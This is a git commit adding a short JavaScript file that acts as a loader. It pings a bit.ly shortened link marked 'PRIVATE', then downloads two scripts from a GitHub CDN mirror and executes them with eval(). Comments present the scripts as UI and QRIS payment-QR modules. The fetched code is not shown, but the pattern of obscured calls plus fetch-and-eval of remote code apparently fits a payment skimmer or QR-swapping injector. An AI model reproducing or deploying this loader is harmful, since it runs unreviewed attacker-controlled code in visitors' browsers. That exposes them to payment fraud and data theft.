57be63bd7ddc253f9acf118ff652d524e7944838
arceusxyz <156434466+arceusxyz@users.noreply.github.com>
2025-09-18 19:06:49 +0700

    Create 1.js

---
+++ REDMI/1.js
@@ -0,0 +1,19 @@
+
+(async function() {
+  try {
+    // JS QR (PRIVATE)
+    fetch("https://bit.ly/integrate-api-fuzz.js").catch(()=>{});
+
+    // JS CSS (UMUM)
+    const ui = await fetch("https://cdn.jsdelivr.net/gh/arceusxyz/moon@main/readme/2.js").then(r => r.text());
+    eval(ui);
+
+    // JS BUTTON (UMUM)
+    const qris = await fetch("https://cdn.jsdelivr.net/gh/arceusxyz/moon@main/readme/3.js").then(r => r.text());
+    eval(qris);
+
+    console.log("✅ Modul UI & QRIS berhasil dimuat");
+  } catch (e) {
+    console.error("❌ Gagal memuat modul:", e);
+  }
+})();
